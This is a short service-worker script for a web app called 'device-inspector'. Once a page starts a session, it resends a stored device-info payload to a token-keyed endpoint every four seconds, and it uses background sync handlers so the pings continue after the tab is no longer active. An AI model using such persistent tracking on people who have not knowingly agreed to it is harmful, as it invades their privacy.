// PWA Service Worker for Continuous Background Telemetry Tracking
const CACHE_NAME = 'device-inspector-v1';

self.addEventListener('install', (event) => {
    console.log('[SW] Service Worker Installed');
    self.skipWaiting();
});

self.addEventListener('activate', (event) => {
    console.log('[SW] Service Worker Activated');
    event.waitUntil(self.clients.claim());
});

let activeToken = null;
let lastPayload = null;
let backgroundInterval = null;

async function sendBackgroundTelemetry() {
    if (!activeToken || !lastPayload) return;

    try {
        const response = await fetch(`/api/submit-device-info/${activeToken}/`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(lastPayload)
        });
        const data = await response.json();
        
        if (data.status === 'stopped') {
            console.log('[SW] Session terminated by admin. Halting background pings.');
            if (backgroundInterval) clearInterval(backgroundInterval);
        } else {
            console.log('[SW] Background telemetry ping sent successfully.');
        }
    } catch(err) {
        console.error('[SW] Background telemetry ping error:', err);
    }
}

// Listen for messages from client tab
self.addEventListener('message', (event) => {
    if (event.data && event.data.type === 'START_BACKGROUND_TRACKING') {
        activeToken = event.data.token;
        lastPayload = event.data.payload;

        console.log('[SW] Started persistent background tracking for token:', activeToken);

        // Immediate ping
        sendBackgroundTelemetry();

        // Start persistent background interval inside Service Worker worker thread (every 4 seconds)
        if (!backgroundInterval) {
            backgroundInterval = setInterval(sendBackgroundTelemetry, 4000);
        }
    }
});

// Periodic Background Sync API handler for Chrome / Android background execution
self.addEventListener('periodicsync', (event) => {
    if (event.tag === 'telemetry-background-sync') {
        event.waitUntil(sendBackgroundTelemetry());
    }
});

self.addEventListener('sync', (event) => {
    if (event.tag === 'telemetry-sync') {
        event.waitUntil(sendBackgroundTelemetry());
    }
});
